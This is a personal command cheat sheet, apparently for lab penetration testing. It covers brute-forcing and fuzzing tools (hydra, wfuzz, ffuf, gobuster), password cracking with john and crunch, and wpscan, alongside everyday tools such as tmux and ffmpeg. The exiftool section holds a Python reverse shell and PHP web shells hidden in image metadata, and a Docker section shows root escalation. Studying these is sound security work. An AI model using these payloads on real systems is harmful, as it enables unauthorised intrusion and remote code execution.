# hydra

## Basic authentification

	hydra -l admin  -p darkweb2017-top100.txt  192.168.56.5 http-get

# dirsearch

	$ dirsearch -u http://192.168.56.5 -w directory-list-2.3-medium.txt


# Web Tool - WFuzz

<https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz>

A tool to FUZZ web applications anywhere.

> Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.

## Installation

Installed in Kali

Github: [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)

```text
pip install wfuzz
```

## Filtering options

```bash
--hs/ss "regex" #Hide/Show
#Simple example, match a string: "Invalid username"
#Regex example: "Invalid *"

--hc/sc CODE #Hide/Show by code in response
--hl/sl NUM #ide/Show by number of lines in response
--hw/sw NUM #ide/Show by number of words in response
--hc/sc NUM #ide/Show by number of chars in response
```

## Output options

```bash
wfuzz -e printers #Prints the available output formats
-f /tmp/output,csv #Saves the output in that location in csv format
```

### Encoders options

```bash
wfuzz -e encoders #Prints the available encoders
#Examples: urlencode, md5, base64, hexlify, uri_hex, doble urlencode
```

In order to use a encoder, you have to indicate it in the **"-w"** or **"-z"** option.

Examples:

```bash
-z file,/path/to/file,md5 #Will use a list inside the file, and will transform each value into its md5 hash before sending it
-w /path/to/file,base64 #Will use a list, and transforms to base64
-z list,each-element-here,hexlify #Inline list and to hex before sending values
```

## CheetSheet

### Login Form bruteforce

#### **POST, Single list, filter string \(hide\)**

```bash
wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php
#Here we have filtered by line
```

#### **POST, 2 lists, filder code \(show\)**

```bash
wfuzz.py -c -z file,users.txt -z file,pass.txt --sc 200 -d "name=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php
#Here we have filtered by code
```

#### **GET, 2 lists, filter string \(show\), proxy, cookies**

```bash
wfuzz -c -w users.txt -w pass.txt --ss "Welcome " -p 127.0.0.1:8080:HTTP -b "PHPSESSIONID=1234567890abcdef;customcookie=hey" "http://example.com/index.php?username=FUZZ&password=FUZ2Z&action=sign+in"
```

### Bruteforce Dicrectory/RESTful bruteforce

[Arjun parameters wordlist](https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/params.txt)

```text
wfuzz -c -w /tmp/tmp/params.txt --hc 404 https://domain.com/api/FUZZ
```

### Path Parameters BF

```bash
wfuzz -c -w ~/git/Arjun/db/params.txt --hw 11 'http://example.com/path%3BFUZZ=FUZZ'
```

### Header Authentication

#### **Basic, 2 lists, filter string \(show\), proxy**

```bash
wfuzz -c -w users.txt -w pass.txt -p 127.0.0.1:8080:HTTP --ss "Welcome" --basic FUZZ:FUZ2Z "http://example.com/index.php"
```

#### **NTLM, 2 lists, filter string \(show\), proxy**

```bash
wfuzz -c -w users.txt -w pass.txt -p 127.0.0.1:8080:HTTP --ss "Welcome" --ntlm 'domain\FUZZ:FUZ2Z' "http://example.com/index.php"
```

### Cookie/Header bruteforce \(vhost brute\)

#### **Cookie, filter code \(show\), proxy**

```bash
wfuzz -c -w users.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "Cookie:id=1312321&user=FUZZ"  "http://example.com/index.php"
```

#### **User-Agent, filter code \(hide\), proxy**

```bash
wfuzz -c -w user-agents.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "User-Agent: FUZZ"  "http://example.com/index.php"
```

#### **Host**

```bash
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-
top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u 
http://example.com -t 100
```

### HTTP Verbs \(methods\) bruteforce

#### **Using file**

```bash
wfuzz -c -w methods.txt -p 127.0.0.1:8080:HTTP --sc 200 -X FUZZ "http://example.com/index.php"
```

#### **Using inline list**

```bash
$ wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/
```

### Directory & Files Bruteforce

```bash
#Filter by whitelisting codes
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ
```


## ffuf

    ffuf -c -w directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ  -t 100
    ffuf -c -w directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
    ffuf -w dirsearch/directory-list-2.3-medium.txt -X POST -d "url=dev/FUZZ.xml" -u http://10.10.10.123/upload.php -H "Cookie: PHPSESSID=j1nanul898l0fbr8bt2vgb548a" -H "Host: vuln.host.com" -H "Referer: http://backup.forwardslash.htb/profilepicture.php" -H "Content-Type: application/x-www-form-urlencoded" -fw 111 -t 300


        -b : Cookie data `"NAME1=VALUE1; NAME2=VALUE2"`
        -c : Colorize output
        -w : Wordlist file path
        -u : Target URL
        -d : POST data


	wfuzz  -c -z file,directory-list-2.3-medium.txt --sc 200 http://192.168.56.5/FUZZ/
	wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something
	wfuzz -w passwords.txt -d "password=FUZZ" -t 100 --hh 803 http://192.168.110.5/index.php

# dirb

	dirb http://192.168.53.128 -X .php,.txt
	dirb  http://192.168.110.8/secret/ -u username:password -X .php


# gobuster

	gobuster dir -u http://192.168.110.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
	gobuster dir -u http://192.168.110.8/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username username --password  password -x php,txt



# iptables

<https://doc.ubuntu-fr.org/iptables>

## reset


<https://kerneltalks.com/virtualization/how-to-reset-iptables-to-default-settings/>

	# accept all requests for all types of connections
	$ iptables -P INPUT ACCEPT
	$ iptables -P OUTPUT ACCEPT
	$ iptables -P FORWARD ACCEPT

	#Delete all existing rules.
	$ iptables -F INPUT
	$ iptables -F OUTPUT
	$ iptables -F FORWARD


	iptables -A INPUT -p tcp -s 192.168.56.1 --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
	iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT

	# Save 
	$ iptables-save > /etc/sysconfig/iptables
	$ iptables-save > /etc/iptables/rules.v4
	# iptables-persistent
	service iptables-persistent save



# tcpdump

- -i : interface
- -A : print in ASCII
- -w : write output  pcap file
- -r : read pcap file

	sudo tcpdump host 192.168.56.8 -i vboxnet0 and icmp -X
	tcpdump -nt -r derpissues.pcap -A 2>/dev/null | grep -P 'pwd='



 
# dd

    sudo fdisk -l
    sudo dd bs=1M if=image.iso of=/dev/sdf status=progress conv=fsync



# WordPress

    wpscan --url http://192.168.110.54/wp
    wpscan --url http://192.168.110.54/wp --enumerate u
    wpscan --url http://192.168.110.54/wp --usernames users.txt --passwords passwords.txt --password-attack xmlrpc
    wpscan --url http://192.168.110.54/wp --plugins-version-detection aggressive --plugins-detection aggressive  --detection-mode aggressive

#  crunch

	crunch 10 10 -t ,%Curtains -O >> dict.txt
	crunch 7 7 -t ,%Flesh -O >> dict.txt


# virtualbox

	$ cat /etc/vbox/networks.conf                                                                                               
	* 192.168.110.0/24

# SSH

	ssh -t user@host $SHELL --norc --noprofile

# grep

	- -w : find whole words only
	- -i : ignore case
	- -r : include all subdirectories
	- -v : inverse search
	- -n : show lines
	- -l : list names of matching files
	- -c : count the number of matches
	- -A, B, C : display the number of lines before, after and before and after a search string
	- --color : with color
	- -e : use with OR, AND and NOT

Example

	grep -n -C 2 --color 2323 /etc/services
	grep -rl pass /var/www/html

## sed


```bash
# Replace
sed 's/<pre>/<pre>\n/g' 
# garder seulement le texte entre <pre> text </pre>
sed -n '/<pre/,/<\/pre/p'
sed -n '/<div id="footer"/,/<\/div/p'
# delete @ at the begining of lines
sed 's/^@\(.*\)/\1/' 
# Supprimer toutes les balises
sed -e 's/<[^>]*>//g'
sed 's/<\/\?[^>]\+>//g'
# Supprimer la première ligne et la dernière ligne
sed -r -e '1d' -e '$d' -e 's/^\s+//'
# Supprimer tout sauf entre 2 balises
sed '/<div class="content">/,/<\/div>/!d'
sed -n '/<div class="content">/,/<\/div/p'

cat cap.txt  | sed 's/([^)]*)//g'| sed '/^[[:space:]]*$/d' |  iconv -f utf8 -t ascii//TRANSLIT | tr '[:upper:]' '[:lower:]' | sort | uniq > cap_finish.txt

```


# nftables

- ajout :  `nft add table ip filter`
- effacement : `nft add table ip filter`
- visualisation : `nft list tables` ou `nft list table ip filter`
- purge : `nft flush table ip filter` ou `nft flush ruleset`

	# cat etc/nftables.conf

	#!/usr/sbin/nft -f
	flush ruleset
	table inet filter {
	  chain input {
	    type filter hook input priority 0; policy drop;

	    iifname lo accept
	    ct state established,related accept
	    tcp dport { ssh, http, https, imap2, imaps, pop3, pop3s, submission, smtp } ct state new accept

	    # ICMP: errors, pings
	    ip protocol icmp icmp type { echo-request, echo-reply, destination-unreachable, time-exceeded, parameter-problem, router-solicitation, router-advertisement } accept
	    # ICMPv6: errors, pings, routing
	    ip6 nexthdr icmpv6 counter accept comment "accept all ICMP types"

	    # Reject other packets
	    ip protocol tcp reject with tcp reset
	  }
	}



- systemctl enable nftables
- systemctl start nftables
- systemctl status nftables
- systemctl restart nftables



# tmux

	C-b C-b     Send the prefix
	C-b C-o     Rotate through the panes
	C-b C-z     Suspend the current client
	C-b Space   Select next layout
	C-b !       Break pane to a new window
	C-b "       Split window vertically
	C-b #       List all paste buffers
	C-b $       Rename current session
	C-b %       Split window horizontally
	C-b &       Kill current window
	C-b '       Prompt for window index to select
	C-b (       Switch to previous client
	C-b )       Switch to next client
	C-b ,       Rename current window
	C-b -       Delete the most recent paste buffer
	C-b .       Move the current window
	C-b /       Describe key binding
	C-b 0       Select window 0
	C-b 1       Select window 1
	C-b 2       Select window 2
	C-b 3       Select window 3
	C-b 4       Select window 4
	C-b 5       Select window 5
	C-b 6       Select window 6
	C-b 7       Select window 7
	C-b 8       Select window 8
	C-b 9       Select window 9
	C-b :       Prompt for a command
	C-b ;       Move to the previously active pane
	C-b =       Choose a paste buffer from a list
	C-b ?       List key bindings
	C-b C       Customize options
	C-b D       Choose a client from a list
	C-b E       Spread panes out evenly
	C-b L       Switch to the last client
	C-b M       Clear the marked pane
	C-b [       Enter copy mode
	C-b ]       Paste the most recent paste buffer
	C-b c       Create a new window
	C-b d       Detach the current client
	C-b f       Search for a pane
	C-b i       Display window information
	C-b l       Select the previously current window
	C-b m       Toggle the marked pane
	C-b n       Select the next window
	C-b o       Select the next pane
	C-b p       Select the previous window
	C-b q       Display pane numbers
	C-b r       Redraw the current client
	C-b s       Choose a session from a list
	C-b t       Show a clock
	C-b w       Choose a window from a list
	C-b x       Kill the active pane
	C-b z       Zoom the active pane
	C-b {       Swap the active pane with the pane above
	C-b }       Swap the active pane with the pane below
	C-b ~       Show messages
	C-b DC      Reset so the visible part of the window follows the cursor
	C-b PPage   Enter copy mode and scroll up

# TLDR

Des pense-bêtes pour des milliers de commandes. Pour apprendre rapidement et simplement son usage via des exemples concrets.

	tldr tar

# Crypt - decrypt

## CyberChef

<https://gchq.github.io/CyberChef/>

# Docker

```bash
./LinEnum.sh
[+] Looks like we're hosting Docker:
Docker version 18.09.1, build 4c52b90
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
21474b9931f0        alpine              "/bin/sh"           12 months ago       Exited (0) 12 months ago                       suspicious_lamport


[+] We're a member of the (docker) group - could possibly misuse these rights!
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)

```


```bash
docker run -v /root/:/mnt -it alpine
```
## Numeration docker

- deepce github

## Configuation

- docker-compose.yml
- gitlab-secrets.json
- gitlab.rb


# Generate dictionaries

## CUPP

> cupp : generate dictionaries for attacks from personal data

Configuration file : `/etc/cupp.cfg`


## john
### Cracking Linux User Password

	john /etc/shadow

### Cracking Password Protected ZIP/RAR Files

	zip2john file.zip > hash.txt
	john --format=zip hash.txt

### Decrypting MD5 Hash

	john --format=raw-md5 hash.txt

### Using Wordlists To Crack Passwords

	john --format=raw-shal --wordlist crunch.txt

## cewl

## crunch

   -t @,%^
	Specifies a pattern, eg: @@god@@@@ where the only the @'s, ,'s, %'s, and ^'s will change.
	@ will insert lower case characters
	, will insert upper case characters
	% will insert numbers
	^ will insert symbols

crunch 3 3 abc + 123 !@# -t ^%@
will generate 3 character words starting with !1a and ending with #3c


```bash
/bin/sh
crunch 3 3 abc + 123 !@# -t @%^
crunch 3 3 abc 123 !@# -t @%^
crunch 4 4 hadi + 0123456789 !,

```


# wodim

Graver des CD/DVD

```bash
# lister les graveurs
wodim --devices
wodim --checkdrive
# caracteristiques du graveur
wodim -prcap
# information sur le media optique
wodim -atip
# effacer rapidement le disque
wodim -v blank=fast
# effacer entirement le disque
wodim -v blank=all
# graver une image iso
wodim -v -eject image.iso
wodim -v speed=4 -eject image.iso
# CD audio
wodim -v -eject speed=4 -pad -audio *.wav
```


# ffmpeg

ffmpeg -i input.mp4 -vcodec libx265 -crf 18 -tag:v hvc1 -preset veryslow -an output.mp4

ffmpeg -i MVI_6150.MOV -vcodec libx265 -crf 18 -tag:v hvc1 -preset medium -an MVI_6150.mp4
ffmpeg -i MVI_6151.MOV -vcodec libx265 -crf 28 -tag:v hvc1 -preset medium -an MVI_6151.mp4

```bash
for file in ./*.MOV; do
	if [[ -f $file ]]; then
		filename=$(basename -- "$file")
		extension="${filename##*.}"
		filename="${filename%.*}"

		# no sound
		ffmpeg -i ${file} -vcodec libx265 -crf 28 -tag:v hvc1 -preset medium -an ${filename}.mp4
		
		# with sound
		# ffmpeg -i ${file} -preset medium -codec:a aac -b:a 128k -codec:v libx264 -pix_fmt yuv420p -b:v 4500k -minrate 4500k -maxrate 9000k -bufsize 9000k -vf scale=-1:1080 ${filename}.mp4
		touch ${filename}.mp4 -r ${file}
		rm ${file}
	fi
done
```


# exiftool

#On kali$ apt-get install exiftool
#Change image filename to include .php before image extension: image.php.jpeg (works with png etc etc)
#Upload, execute image location adding ?cmd=command-here example: www.site.com/image.php.jpeg?cmd=ls
#To acheive terminal shell, execute rev shell python from pentest monkey etc etc.
#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

exiftool -DocumentName="<h1>F1uffyGoat<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg


or 

<?php $cmd = $_GET['cmd']; echo system ($cmd);?>

or

<?php system($_GET['cmd']); ?>

exiftool -Commment "<?php passthru(\$_GET'cmd')," _halt_compiler();" picture.jpeg


	curl 'http://oscp.local/dvwa/hackable/uploads/img.php.jpg' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: security=high; PHPSESSID=79bg68np1331quqq5u6d5mctch' -H 'Upgrade-Insecure-Requests: 1' -H 'If-Modified-Since: Tue, 18 Jan 2022 18:23:25 GMT' -H 'If-None-Match: "263d-5d5df5d69aa4a"' -H 'Cache-Control: max-age=0'



# touch

```bash
stat tgs.txt
```
	

Setting Access and Modification
```bash
touch -d "2012-10-19 12:12:12.000000000 +0530" tgs.txt
```
update the time-stamp of file a.txt with the time-stamp of tgs.txt file
```bash
touch a.txt -r tgs.txt
```
